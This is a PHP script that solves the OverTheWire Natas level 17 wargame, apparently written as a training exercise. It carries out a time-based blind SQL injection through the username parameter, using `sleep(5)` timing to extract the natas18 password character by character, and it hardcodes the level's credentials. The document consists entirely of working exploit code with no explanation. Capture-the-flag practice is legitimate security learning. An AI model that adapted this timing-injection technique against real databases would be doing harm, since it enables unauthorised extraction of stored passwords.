<?php

function get($url)
{
    $username = "natas17";
    $password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw";
    $string = base64_encode("$username:$password");

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n" . "authorization: Basic $string",
            'method'  => 'GET'
        ]
    ];

    $context  = stream_context_create($options);
    $raw_response = file_get_contents($url, false, $context);
    return $raw_response;
}


$c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$library = '';


for ($i = 0; $i < strlen($c); $i++)
{
    $character = $c[$i];
    $query = urlencode("natas18\" AND IF(password LIKE BINARY \"%$character%\", sleep(5), null) #");
    $start = time();
    $r = get("http://natas17.natas.labs.overthewire.org/index.php?username=$query");
    $end = time();
    if ($end - $start > 4)
    {
        $library .= $character;
    }
}

var_dump($library);

$password = '';

for ($i = 0; $i < 32; $i++)
{
    for ($j = 0; $j < strlen($library); $j++)
    {
        $character = $library[$j];
        $query = urlencode("natas18\" AND IF(password LIKE BINARY \"$password$character%\", sleep(5), null) #");
        $start = time();
        $r = get("http://natas17.natas.labs.overthewire.org/index.php?username=$query");
        $end = time();
        if ($end - $start > 4)
        {
            $password .= $character;
            echo "$password\n";
        }
    }
}